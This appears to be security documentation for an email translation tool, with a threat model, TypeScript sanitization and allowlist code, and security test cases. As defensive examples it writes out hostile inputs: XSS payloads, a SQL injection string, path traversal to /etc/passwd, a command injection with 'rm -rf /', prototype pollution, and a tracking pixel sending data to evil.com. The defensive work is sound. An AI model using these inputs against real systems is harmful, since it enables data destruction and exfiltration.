# Email Translator — Security Documentation

## Threat Model

### Trust Assumptions

This tool operates under the following trust model:

1. **Source text is untrusted**: Email bodies may contain malicious content, encoding attacks, script injection attempts, or exfiltration vectors.
2. **Translation providers are semi-trusted**: External translation APIs may be compromised, log data inappropriately, or return malicious content.
3. **User input is untrusted**: Language selections, configuration changes, and clipboard operations may be manipulated.
4. **Browser environment is trusted**: We assume the browser's same-origin policy, CSP, and clipboard API are functioning correctly.

### Attack Surface

| Vector                             | Risk   | Mitigation                                                    |
| ---------------------------------- | ------ | ------------------------------------------------------------- |
| **XSS via source text**            | High   | Sanitize HTML, escape special chars before rendering          |
| **XSS via translated output**      | High   | Sanitize provider responses, treat as untrusted               |
| **Prototype pollution**            | Medium | Validate object shapes, avoid dynamic key assignment          |
| **ReDoS (Regular Expression DoS)** | Medium | Use safe regex patterns, timeout long operations              |
| **Data exfiltration**              | High   | Never send to unapproved endpoints, log provider usage        |
| **Clipboard injection**            | Medium | Sanitize before clipboard write, validate clipboard API usage |
| **Memory exhaustion**              | Medium | Enforce size limits on input/output                           |
| **Language code injection**        | Low    | Whitelist valid language codes only                           |

---

## Unsafe Input Categories

### 1. Malformed or Hostile Email Bodies

**Examples:**

- HTML/XML with script tags: `<script>alert('xss')</script>`
- Encoded attacks: `&lt;script&gt;`, `\u003cscript\u003e`
- Malformed Unicode: broken surrogate pairs, overlong sequences
- Binary data: embedded images, null bytes, non-text content
- Extremely long strings: >10MB of text
- Deeply nested HTML: DoS via parser exhaustion

**Handling:**

```typescript
// Max size enforcement
const MAX_TEXT_SIZE = 1_000_000; // 1MB of text

// Sanitization before processing
import DOMPurify from "dompurify";

function sanitizeEmailBody(raw: string): string {
  if (raw.length > MAX_TEXT_SIZE) {
    throw new SecurityError("Email body exceeds maximum size");
  }

  // Strip HTML entirely (translation should work on plaintext)
  const plaintext = DOMPurify.sanitize(raw, {
    ALLOWED_TAGS: [],
    ALLOWED_ATTR: [],
  });

  // Remove null bytes and control characters except newlines/tabs
  return plaintext.replace(/[\x00-\x08\x0B-\x0C\x0E-\x1F\x7F]/g, "");
}
```

### 2. Language Code Injection

**Examples:**

- SQL injection attempts: `en'; DROP TABLE--`
- Path traversal: `../../etc/passwd`
- Command injection: `en && rm -rf /`
- Non-standard codes: arbitrary strings instead of ISO codes

**Handling:**

```typescript
// Strict whitelist of ISO 639-1 codes
const VALID_LANGUAGE_CODES = new Set([
  "en",
  "es",
  "fr",
  "de",
  "it",
  "pt",
  "ru",
  "zh",
  "ja",
  "ko",
  "ar",
  "hi",
  "bn",
  "pa",
  "te",
  "mr",
  "ta",
  "tr",
  "vi",
  "pl",
  // ... exhaustive list
]);

function validateLanguageCode(code: string): boolean {
  return typeof code === "string" && /^[a-z]{2}$/.test(code) && VALID_LANGUAGE_CODES.has(code);
}

function sanitizeLanguageCode(code: unknown): string {
  if (typeof code !== "string") {
    throw new ValidationError("Language code must be a string");
  }

  const normalized = code.toLowerCase().trim().slice(0, 2);

  if (!validateLanguageCode(normalized)) {
    throw new ValidationError(`Invalid language code: ${code}`);
  }

  return normalized;
}
```

### 3. Translation Provider Responses

**Examples:**

- XSS in translated text: provider returns `<img src=x onerror=alert(1)>`
- Encoding attacks: provider returns encoded scripts
- Excessively large responses: DoS via memory exhaustion
- Malformed JSON: parser crashes or hangs
- Injection of tracking pixels: `<img src="https://evil.com/track?data=...">`

**Handling:**

```typescript
const MAX_RESPONSE_SIZE = 2_000_000; // 2MB

async function fetchTranslation(
  text: string,
  from: string,
  to: string,
  provider: TranslationProvider,
): Promise<string> {
  const response = await provider.translate(text, from, to);

  // Size check
  if (response.length > MAX_RESPONSE_SIZE) {
    throw new SecurityError("Translation response exceeds maximum size");
  }

  // Sanitize output (strip HTML, keep plaintext)
  const sanitized = DOMPurify.sanitize(response, {
    ALLOWED_TAGS: [],
    ALLOWED_ATTR: [],
  });

  // Additional validation
  if (sanitized.length === 0 && response.length > 0) {
    throw new SecurityError("Translation response contained only unsafe content");
  }

  return sanitized;
}
```

### 4. Configuration Injection

**Examples:**

- API key exfiltration: user-provided config sends keys to attacker
- Endpoint override: user forces translation to malicious server
- Prototype pollution: `{"__proto__": {"isAdmin": true}}`

**Handling:**

```typescript
interface ProviderConfig {
  apiKey: string;
  endpoint: string;
  timeout: number;
}

const ALLOWED_ENDPOINTS = new Set([
  "https://api.openai.com/v1/chat/completions",
  "https://translation.googleapis.com/language/translate/v2",
  // ... approved providers only
]);

function validateProviderConfig(config: unknown): ProviderConfig {
  if (typeof config !== "object" || config === null) {
    throw new ValidationError("Config must be an object");
  }

  // Avoid prototype pollution
  const safe = Object.create(null);
  const raw = config as Record<string, unknown>;

  // Validate endpoint
  if (typeof raw.endpoint !== "string") {
    throw new ValidationError("Endpoint must be a string");
  }

  const url = new URL(raw.endpoint); // Throws if invalid
  if (!ALLOWED_ENDPOINTS.has(url.origin + url.pathname)) {
    throw new SecurityError(`Endpoint not in allowlist: ${raw.endpoint}`);
  }
  safe.endpoint = url.toString();

  // Validate API key (no validation beyond type - store securely)
  if (typeof raw.apiKey !== "string" || raw.apiKey.length < 10) {
    throw new ValidationError("Invalid API key format");
  }
  safe.apiKey = raw.apiKey;

  // Validate timeout
  if (typeof raw.timeout !== "number" || raw.timeout < 1000 || raw.timeout > 60000) {
    throw new ValidationError("Timeout must be between 1000-60000ms");
  }
  safe.timeout = raw.timeout;

  return safe as ProviderConfig;
}
```

---

## Security Best Practices

### Input Validation

1. **Size limits**: Enforce maximum sizes before processing
2. **Type checking**: Validate types at runtime, don't trust TypeScript alone
3. **Whitelist approach**: Prefer allowlists over denylists for codes and endpoints
4. **Sanitization**: Strip HTML and dangerous content early in the pipeline
5. **Encoding normalization**: Convert to UTF-8, handle encoding detection errors

### Output Handling

1. **Escape by default**: Treat all provider responses as untrusted
2. **Content Security Policy**: Ensure no inline scripts or unsafe-eval
3. **Plaintext rendering**: Display translations as text, not HTML
4. **Clipboard safety**: Sanitize before clipboard writes

### Provider Integration

1. **Endpoint allowlisting**: Only approved translation API endpoints
2. **API key storage**: Never log or display API keys
3. **Request signing**: Use HMAC or OAuth where supported
4. **Rate limiting**: Prevent abuse via excessive translation requests
5. **Timeout enforcement**: Cancel long-running requests (default 30s)
6. **Error sanitization**: Don't leak internal errors to UI

### Dependency Safety

1. **Pin versions**: Use exact versions in package.json
2. **Audit regularly**: Run `npm audit` or `bun audit` in CI
3. **Minimize attack surface**: Only use well-maintained sanitization libraries (DOMPurify, validator.js)
4. **CSP compliance**: Ensure dependencies don't require unsafe-eval

---

## Error Handling

### Security-Sensitive Errors

Never expose internal details in user-facing errors:

```typescript
// ❌ BAD
catch (err) {
  throw new Error(`Translation failed: ${err.message}`);
  // Leaks provider errors, stack traces, endpoints
}

// ✅ GOOD
catch (err) {
  logger.error('Translation failed', {
    error: err,
    provider: providerName,
    // Log full details server-side only
  });

  throw new TranslationError(
    'Translation service unavailable. Please try again.',
    { cause: 'provider_error' }
  );
}
```

### Error Categories

| Error Type        | User Message                             | Log Details                         |
| ----------------- | ---------------------------------------- | ----------------------------------- |
| `ValidationError` | "Invalid input. Please check your text." | Full validation failure reason      |
| `SecurityError`   | "Request blocked for safety."            | Attack vector, sanitization details |
| `ProviderError`   | "Translation service unavailable."       | Provider response, status code      |
| `NetworkError`    | "Network error. Check your connection."  | Endpoint, timeout, fetch error      |
| `RateLimitError`  | "Too many requests. Try again later."    | Rate limit metrics, user identifier |

---

## Audit Log

All security-relevant operations should be logged (server-side only, not in browser):

```typescript
interface SecurityEvent {
  timestamp: string;
  eventType: "validation_failure" | "sanitization" | "rate_limit" | "provider_error";
  userId?: string;
  details: Record<string, unknown>;
  severity: "low" | "medium" | "high";
}

// Example usage
logger.securityEvent({
  timestamp: new Date().toISOString(),
  eventType: "sanitization",
  details: {
    originalLength: raw.length,
    sanitizedLength: sanitized.length,
    strippedTags: ["script", "iframe"],
  },
  severity: "medium",
});
```

---

## Testing Security Controls

### Test Cases (required)

1. **XSS Prevention**
   - Input: `<script>alert('xss')</script>Hello`
   - Expected: `Hello` (script stripped)

2. **Size Limits**
   - Input: 10MB text blob
   - Expected: `SecurityError` thrown

3. **Language Code Validation**
   - Input: `en'; DROP TABLE users--`
   - Expected: `ValidationError` thrown

4. **Provider Response Sanitization**
   - Mock response: `<img src=x onerror=alert(1)>Translated`
   - Expected: `Translated` only

5. **Encoding Attacks**
   - Input: `\u003cscript\u003ealert(1)\u003c/script\u003e`
   - Expected: Decoded and sanitized

6. **Null Byte Injection**
   - Input: `Hello\x00World`
   - Expected: `HelloWorld` (null byte removed)

7. **Prototype Pollution**
   - Config: `{"__proto__": {"polluted": true}}`
   - Expected: `ValidationError`, no pollution

---

## Future Considerations

### When Integrating with Main App

1. **Authentication**: Verify user identity before translation
2. **Authorization**: Check if user has translation feature access
3. **Encryption**: Consider encrypting sensitive email bodies in transit
4. **Audit trail**: Log translations for compliance (GDPR, data residency)
5. **Content filtering**: Additional checks for PII, credentials, secrets

### Provider Security Review Checklist

Before approving a new translation provider:

- [ ] Endpoint uses HTTPS with valid certificate
- [ ] Provider has published security policy
- [ ] Data retention policy is acceptable (preferably no retention)
- [ ] Privacy policy allows email translation use case
- [ ] Rate limiting is reasonable
- [ ] API authentication is secure (API key, OAuth, JWT)
- [ ] Provider has SOC 2 / ISO 27001 or equivalent
- [ ] No data sale or cross-customer training clauses
- [ ] GDPR/CCPA compliance verified if applicable

---

## Responsible Disclosure

If security issues are discovered in this tool:

1. **Do not** create a public GitHub issue
2. Email security contact (see main repository README)
3. Include:
   - Affected component (file path)
   - Attack vector and proof of concept
   - Suggested mitigation
4. Allow 90 days for patching before public disclosure

---

## References

- [OWASP Input Validation Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [DOMPurify Documentation](https://github.com/cure53/DOMPurify)
- [Content Security Policy Reference](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)

---

**Last Updated:** 2026-07-23  
**Version:** 1.0.0  
**Status:** Initial security documentation
